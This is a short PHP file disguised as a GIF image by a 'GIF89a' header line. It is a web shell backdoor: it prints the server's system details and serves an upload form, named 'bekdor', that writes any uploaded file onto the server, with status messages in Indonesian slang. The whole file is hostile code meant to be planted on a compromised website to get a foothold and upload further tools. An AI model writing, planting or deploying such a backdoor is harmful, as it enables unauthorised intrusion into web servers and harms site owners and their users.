GIF89a
<?php
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='bekdor'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['bekdor']['tmp_name'], $_FILES['bekdor']['name'])) {
	echo "Sucksess!";
	} else {
	echo "Gagal gk tau kenapa, gw gk tau hehe.";
	}
}
?>
